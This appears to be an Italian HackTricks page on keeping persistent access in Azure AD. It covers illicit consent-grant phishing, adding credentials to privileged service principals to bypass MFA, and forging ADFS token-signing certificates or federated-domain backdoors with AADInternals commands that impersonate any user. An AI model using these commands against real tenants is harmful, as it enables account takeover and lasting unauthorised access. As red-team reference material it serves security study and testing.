# Az - Persistenza

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### Concessione di consenso illecito

Per impostazione predefinita, qualsiasi utente pu√≤ registrare un'applicazione in Azure AD. Quindi √® possibile registrare un'applicazione (solo per il tenant di destinazione) che richiede autorizzazioni ad alto impatto con il consenso dell'amministratore (approvarla se si √® l'amministratore) - come inviare posta per conto di un utente, gestione dei ruoli, ecc. Questo ci permetter√† di **eseguire attacchi di phishing** che sarebbero molto **fruttuosi** in caso di successo.

Inoltre, potresti anche accettare quell'applicazione con il tuo utente come modo per mantenere l'accesso su di essa.

### Applicazioni e Service Principals

Con i privilegi di Application Administrator, GA o un ruolo personalizzato con le autorizzazioni microsoft.directory/applications/credentials/update, possiamo aggiungere credenziali (segreto o certificato) a un'applicazione esistente.

√à possibile **prendere di mira un'applicazione con autorizzazioni elevate** o **aggiungere una nuova applicazione** con autorizzazioni elevate.

Un ruolo interessante da aggiungere all'applicazione sarebbe il **ruolo di amministratore di autenticazione privilegiata** in quanto consente di **reimpostare la password** degli amministratori globali.

Questa tecnica consente anche di **eludere l'MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Per l'autenticazione basata su certificato

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federazione - Certificato di firma del token

Con i privilegi **DA** sull'AD locale, √® possibile creare e importare **nuovi certificati di firma del token** e **certificati di decrittazione del token** che hanno una validit√† molto lunga. Ci√≤ ci permetter√† di **accedere come qualsiasi utente** di cui conosciamo l'ImuutableID.

**Esegui** il seguente comando come **DA sul server ADFS** per creare nuovi certificati (password predefinita 'AADInternals'), aggiungerli ad ADFS, disabilitare il rollver automatico e riavviare il servizio:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Quindi, aggiorna le informazioni del certificato con Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federazione - Dominio Affidabile

Con i privilegi GA su un tenant, √® possibile **aggiungere un nuovo dominio** (deve essere verificato), configurare il suo tipo di autenticazione come Federato e configurare il dominio per **affidarsi a un certificato specifico** (any.sts nel comando sottostante) e all'emittente:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Riferimenti

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
